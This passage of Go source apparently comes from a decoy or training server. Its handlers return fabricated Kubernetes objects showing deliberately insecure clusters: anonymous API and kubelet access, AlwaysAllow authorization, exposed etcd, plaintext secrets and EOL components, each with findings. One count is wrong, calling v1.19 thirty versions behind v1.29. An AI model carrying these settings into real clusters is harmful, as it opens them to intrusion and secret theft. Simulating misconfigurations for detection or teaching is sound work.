			"WARN: No admission webhooks for policy enforcement",
			"CRIT: Lateral movement is unrestricted between all namespaces",
		},
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// K05: Inadequate Logging & Monitoring
// ---------------------------------------------------------------------------

func (h *Handler) serveK8sInadequateLogging(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	_ = rng

	resp := toJSON(map[string]interface{}{
		"apiVersion": "v1",
		"kind":       "ConfigMap",
		"metadata": map[string]interface{}{
			"name":      "kube-apiserver-config",
			"namespace": "kube-system",
		},
		"apiserver_flags": map[string]interface{}{
			"--audit-log-path":       "",
			"--audit-policy-file":    "",
			"--audit-log-maxage":     0,
			"--audit-log-maxbackup":  0,
			"--audit-log-maxsize":    0,
			"--audit-webhook-config": "",
			"--profiling":            true,
			"--enable-admission-plugins": "NamespaceLifecycle,LimitRanger,ServiceAccount",
		},
		"logging_infrastructure": map[string]interface{}{
			"fluentd":          false,
			"fluentbit":        false,
			"filebeat":         false,
			"promtail":         false,
			"log_aggregator":   "none",
			"siem_integration": false,
		},
		"monitoring_stack": map[string]interface{}{
			"prometheus":          false,
			"grafana":             false,
			"alertmanager":        false,
			"metrics_server":      false,
			"runtime_security":    "none",
			"falco":               false,
			"sysdig":              false,
		},
		"audit_coverage": map[string]interface{}{
			"api_requests":          "not logged",
			"pod_exec":              "not logged",
			"secret_access":         "not logged",
			"rbac_changes":          "not logged",
			"node_operations":       "not logged",
			"authentication_events": "not logged",
		},
		"findings": []string{
			"CRIT: No audit policy configured - API server activity unmonitored",
			"CRIT: --audit-log-path not set - no audit logs being written",
			"CRIT: No log aggregation infrastructure deployed",
			"CRIT: No monitoring stack (Prometheus/Grafana) installed",
			"WARN: --profiling enabled on API server (information disclosure risk)",
			"CRIT: No runtime security tool (Falco/Sysdig) deployed",
			"CRIT: Secret access, RBAC changes, and pod exec not being audited",
			"WARN: EventRateLimit admission plugin not enabled",
		},
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// K06: Broken Authentication
// ---------------------------------------------------------------------------

func (h *Handler) serveK8sBrokenAuth(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	serverIP := fmt.Sprintf("10.%d.%d.%d", rng.Intn(255), rng.Intn(255), rng.Intn(255))

	resp := toJSON(map[string]interface{}{
		"apiVersion": "v1",
		"kind":       "ComponentStatus",
		"metadata": map[string]interface{}{
			"name": "kube-apiserver",
		},
		"apiserver_config": map[string]interface{}{
			"--anonymous-auth":             true,
			"--enable-bootstrap-token-auth": true,
			"--basic-auth-file":            "/etc/kubernetes/basic_auth.csv",
			"--token-auth-file":            "/etc/kubernetes/token_auth.csv",
			"--insecure-port":              8080,
			"--insecure-bind-address":      "0.0.0.0",
			"--oidc-issuer-url":            "",
			"--authorization-mode":         "AlwaysAllow",
			"--client-ca-file":             "",
			"--kubelet-certificate-authority": "",
		},
		"accessible_endpoints": []map[string]interface{}{
			{
				"endpoint":      "https://" + serverIP + ":6443",
				"anonymous":     true,
				"auth_required": false,
			},
			{
				"endpoint":      "http://" + serverIP + ":8080",
				"tls":           false,
				"auth_required": false,
				"deprecated":    true,
			},
		},
		"anonymous_access_test": map[string]interface{}{
			"request":     "GET /api/v1/namespaces",
			"response":    "200 OK",
			"namespaces":  []string{"default", "kube-system", "kube-public", "production", "staging"},
			"can_list_secrets":    true,
			"can_create_pods":     true,
			"can_exec_into_pods":  true,
		},
		"service_account_tokens": map[string]interface{}{
			"default_token_automount":   true,
			"token_expiration":          "never",
			"bound_service_account_tokens": false,
		},
		"findings": []string{
			"CRIT: --anonymous-auth=true - unauthenticated API access allowed",
			"CRIT: --insecure-port=8080 - unencrypted API endpoint on 0.0.0.0",
			"CRIT: --authorization-mode=AlwaysAllow - no authorization checks",
			"CRIT: Anonymous user can list secrets, create pods, and exec into pods",
			"WARN: Basic auth file in use - deprecated and insecure",
			"WARN: Static token auth file in use - tokens never expire",
			"CRIT: No OIDC integration - no centralized identity management",
			"WARN: No client CA certificate configured for mutual TLS",
		},
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// K07: Missing Network Segmentation
// ---------------------------------------------------------------------------

func (h *Handler) serveK8sNoNetworkSegmentation(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	clusterCIDR := fmt.Sprintf("10.%d.0.0/16", rng.Intn(255))
	serviceCIDR := fmt.Sprintf("10.%d.0.0/16", rng.Intn(255)+1)

	resp := toJSON(map[string]interface{}{
		"apiVersion": "v1",
		"kind":       "ConfigMap",
		"metadata": map[string]interface{}{
			"name":      "cluster-network-config",
			"namespace": "kube-system",
		},
		"network_topology": map[string]interface{}{
			"cni_plugin":        "flannel",
			"pod_cidr":          clusterCIDR,
			"service_cidr":      serviceCIDR,
			"network_model":     "flat",
			"encryption":        false,
			"wireguard":         false,
		},
		"connectivity_matrix": []map[string]interface{}{
			{
				"source":      "production",
				"destination": "kube-system",
				"allowed":     true,
				"policy":      "no restriction",
			},
			{
				"source":      "production",
				"destination": "staging",
				"allowed":     true,
				"policy":      "no restriction",
			},
			{
				"source":      "staging",
				"destination": "production",
				"allowed":     true,
				"policy":      "no restriction",
			},
			{
				"source":      "default",
				"destination": "production",
				"allowed":     true,
				"policy":      "no restriction",
			},
			{
				"source":      "monitoring",
				"destination": "production",
				"allowed":     true,
				"policy":      "no restriction",
			},
			{
				"source":      "any-pod",
				"destination": "kubernetes-api",
				"allowed":     true,
				"policy":      "no restriction",
			},
			{
				"source":      "any-pod",
				"destination": "internet",
				"allowed":     true,
				"policy":      "no egress restriction",
			},
		},
		"metadata_api": map[string]interface{}{
			"cloud_metadata_accessible": true,
			"imds_v1_enabled":           true,
			"endpoint":                  "http://169.254.169.254/latest/meta-data/",
		},
		"findings": []string{
			"CRIT: Flat network - all pods can communicate with all other pods",
			"CRIT: Staging can reach production services directly",
			"CRIT: No egress restrictions - data exfiltration possible from any pod",
			"CRIT: Cloud metadata service (IMDS v1) accessible from pods",
			"WARN: No network encryption (WireGuard/IPsec) between nodes",
			"CRIT: kube-system accessible from any namespace",
			"WARN: Flannel CNI does not support NetworkPolicy enforcement",
			"CRIT: Kubernetes API accessible from all pods without restriction",
		},
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// K08: Secrets Mismanagement
// ---------------------------------------------------------------------------

func (h *Handler) serveK8sSecretsMismanagement(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	uid := h.randomHex(rng, 8) + "-" + h.randomHex(rng, 4) + "-" + h.randomHex(rng, 4) + "-" + h.randomHex(rng, 4) + "-" + h.randomHex(rng, 12)
	ts := time.Now().UTC().Format(time.RFC3339)
	dbPass := h.randomHex(rng, 16)
	apiKey := h.randomHex(rng, 32)

	resp := toJSON(map[string]interface{}{
		"apiVersion": "v1",
		"kind":       "Secret",
		"metadata": map[string]interface{}{
			"name":              "prod-app-secrets",
			"namespace":         "production",
			"uid":               uid,
			"creationTimestamp": ts,
		},
		"type": "Opaque",
		"data": map[string]interface{}{
			"DB_PASSWORD":    base64Encode(dbPass),
			"API_KEY":        base64Encode(apiKey),
			"JWT_SECRET":     base64Encode("super-secret-jwt-key-" + h.randomHex(rng, 12)),
			"REDIS_PASSWORD": base64Encode(h.randomHex(rng, 20)),
			"TLS_KEY":        base64Encode("-----BEGIN RSA PRIVATE KEY-----\n" + h.randomHex(rng, 64) + "\n-----END RSA PRIVATE KEY-----"),
		},
		"data_decoded": map[string]interface{}{
			"DB_PASSWORD":    dbPass,
			"API_KEY":        apiKey,
			"JWT_SECRET":     "super-secret-jwt-key-" + h.randomHex(rng, 12),
			"REDIS_PASSWORD": h.randomHex(rng, 20),
		},
		"etcd_storage": map[string]interface{}{
			"encryption_at_rest":     false,
			"encryption_provider":    "identity (plaintext)",
			"etcd_tls":              false,
			"etcd_client_cert_auth": false,
			"etcd_peer_cert_auth":   false,
		},
		"secret_access": map[string]interface{}{
			"rbac_restricted":           false,
			"pods_with_secret_mounted":  23,
			"service_accounts_with_get": 15,
			"audit_logging":             false,
		},
		"git_history": map[string]interface{}{
			"secrets_in_git":      true,
			"yaml_with_base64":    "manifests/secrets.yaml committed 47 times",
			"git_leaks_scan":      "never",
		},
		"findings": []string{
			"CRIT: etcd stores secrets in plaintext (no EncryptionConfiguration)",
			"CRIT: etcd communication not encrypted with TLS",
			"CRIT: Secrets committed to git repository as base64 YAML",
			"WARN: 23 pods mount this secret - review necessity",
			"WARN: 15 service accounts can read secrets - excessive access",
			"CRIT: No audit logging for secret access events",
			"CRIT: Not using external secrets manager (Vault/KMS/Sealed Secrets)",
			"WARN: base64 encoding is NOT encryption - secrets are trivially decoded",
		},
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// K09: Misconfigured Cluster Components
// ---------------------------------------------------------------------------

func (h *Handler) serveK8sMisconfiguredCluster(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	nodeIP := fmt.Sprintf("10.%d.%d.%d", rng.Intn(255), rng.Intn(255), rng.Intn(255))

	resp := toJSON(map[string]interface{}{
		"apiVersion": "v1",
		"kind":       "Node",
		"metadata": map[string]interface{}{
			"name": "worker-node-" + h.randomHex(rng, 4),
			"labels": map[string]interface{}{
				"kubernetes.io/os":   "linux",
				"kubernetes.io/arch": "amd64",
				"node-role":          "worker",
			},
		},
		"kubelet_config": map[string]interface{}{
			"--read-only-port":          10255,
			"--anonymous-auth":          true,
			"--authorization-mode":      "AlwaysAllow",
			"--streaming-connection-idle-timeout": "0",
			"--protect-kernel-defaults": false,
			"--make-iptables-util-chains": true,
			"--event-qps":              0,
			"--rotate-certificates":    false,
			"--tls-cert-file":          "",
			"--tls-private-key-file":   "",
			"address":                  "0.0.0.0",
		},
		"exposed_endpoints": []map[string]interface{}{
			{
				"endpoint":    "http://" + nodeIP + ":10255/pods",
				"auth":        "none",
				"tls":         false,
				"description": "Kubelet read-only API - lists all pods with env vars",
			},
			{
				"endpoint":    "https://" + nodeIP + ":10250/run/production/webapp/bash",
				"auth":        "anonymous",
				"tls":         true,
				"description": "Kubelet exec endpoint - execute commands in pods",
			},
			{
				"endpoint":    "http://" + nodeIP + ":10256/healthz",
				"auth":        "none",
				"tls":         false,
				"description": "Kube-proxy health check",
			},
		},
		"etcd_config": map[string]interface{}{
			"--client-cert-auth":           false,
			"--peer-client-cert-auth":      false,
			"--auto-tls":                   true,
			"--listen-client-urls":         "http://0.0.0.0:2379",
			"data_dir_permissions":         "0777",
		},
		"scheduler_config": map[string]interface{}{
			"--profiling":              true,
			"--bind-address":           "0.0.0.0",
			"--port":                   10251,
		},
		"findings": []string{
			"CRIT: Kubelet --read-only-port=10255 exposes pod info without auth",
			"CRIT: Kubelet --anonymous-auth=true - unauthenticated exec into pods",
			"CRIT: Kubelet --authorization-mode=AlwaysAllow",
			"CRIT: etcd listening on 0.0.0.0:2379 without client cert auth",
			"CRIT: etcd data directory permissions 0777 (world-writable)",
			"WARN: Kubelet certificate rotation disabled",
			"WARN: Kubelet TLS not configured - no cert/key files",
			"WARN: Scheduler profiling enabled and bound to 0.0.0.0",
			"CRIT: streaming-connection-idle-timeout=0 - connections never timeout",
		},
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// K10: Outdated & Vulnerable Components
// ---------------------------------------------------------------------------

func (h *Handler) serveK8sOutdatedComponents(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	_ = rng

	resp := toJSON(map[string]interface{}{
		"apiVersion": "v1",
		"kind":       "ComponentStatusList",
		"cluster_version": map[string]interface{}{
			"client_version": map[string]interface{}{
				"major":        "1",
				"minor":        "19",
				"gitVersion":   "v1.19.0",
				"gitCommit":    "e19964183377d0ec2052d1f1fa930c4d7575bd50",
				"buildDate":    "2020-08-26T14:30:33Z",
				"goVersion":    "go1.15",
				"platform":     "linux/amd64",
			},
			"server_version": map[string]interface{}{
				"major":        "1",
				"minor":        "19",
				"gitVersion":   "v1.19.0",
				"buildDate":    "2020-08-26T14:23:04Z",
				"platform":     "linux/amd64",
			},
		},
		"component_versions": []map[string]interface{}{
			{
				"component":       "kube-apiserver",
				"version":         "v1.19.0",
				"latest_stable":   "v1.29.2",
				"versions_behind": 30,
				"eol":             true,
			},
			{
				"component":       "kube-controller-manager",
				"version":         "v1.19.0",
				"latest_stable":   "v1.29.2",
				"versions_behind": 30,
				"eol":             true,
			},
			{
				"component":       "kube-scheduler",
				"version":         "v1.19.0",
				"latest_stable":   "v1.29.2",
				"versions_behind": 30,
				"eol":             true,
			},
			{
				"component":       "kubelet",
				"version":         "v1.19.0",
				"latest_stable":   "v1.29.2",
				"versions_behind": 30,
				"eol":             true,
			},
			{
				"component":       "etcd",
				"version":         "3.4.9",
				"latest_stable":   "3.5.12",
				"versions_behind": 15,
				"eol":             true,
			},
			{
				"component":       "coredns",
				"version":         "1.7.0",
				"latest_stable":   "1.11.1",
				"versions_behind": 12,
				"eol":             true,
			},
		},
		"known_cves": []map[string]interface{}{
			{
				"cve":       "CVE-2021-25741",
				"severity":  "HIGH",
				"component": "kubelet",
				"summary":   "Symlink exchange can allow host filesystem access",
				"cvss":      8.1,
			},
			{
				"cve":       "CVE-2021-25735",
				"severity":  "MEDIUM",
				"component": "kube-apiserver",
				"summary":   "Validating admission webhook can be bypassed",
				"cvss":      6.5,
			},
			{
				"cve":       "CVE-2022-3162",
				"severity":  "MEDIUM",
				"component": "kube-apiserver",
				"summary":   "Unauthorized read of custom resources",
				"cvss":      6.5,
			},
			{
				"cve":       "CVE-2022-3294",
				"severity":  "HIGH",
				"component": "kube-apiserver",
				"summary":   "Node address isn't always verified when proxying",
				"cvss":      8.8,
			},
			{
				"cve":       "CVE-2023-2728",
				"severity":  "HIGH",
				"component": "kube-apiserver",
				"summary":   "ServiceAccount token secrets bypass mountable secrets policy",
				"cvss":      7.2,
			},
		},
		"upgrade_path": map[string]interface{}{
			"current":            "v1.19.0",
			"next_minor":         "v1.20.15",
			"recommended_target": "v1.28.6",
			"breaking_changes":   18,
			"deprecated_apis":    42,
			"skew_policy":        "maximum 3 minor versions between components",
		},
		"findings": []string{
			"CRIT: Kubernetes v1.19.0 is EOL (end of life since Oct 2021)",
			"CRIT: 5 known CVEs affecting current cluster version",
			"CRIT: 30 minor versions behind latest stable release",
			"CRIT: etcd 3.4.9 is EOL with known vulnerabilities",
			"WARN: 42 deprecated APIs in use that will be removed in upgrade",
			"CRIT: Go 1.15 runtime has known security vulnerabilities",
			"WARN: Major upgrade path requires careful planning (18 breaking changes)",
		},
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// Helper: base64 encoding for Kubernetes secrets
// ---------------------------------------------------------------------------

func base64Encode(s string) string {
	return base64.StdEncoding.EncodeToString([]byte(s))
}
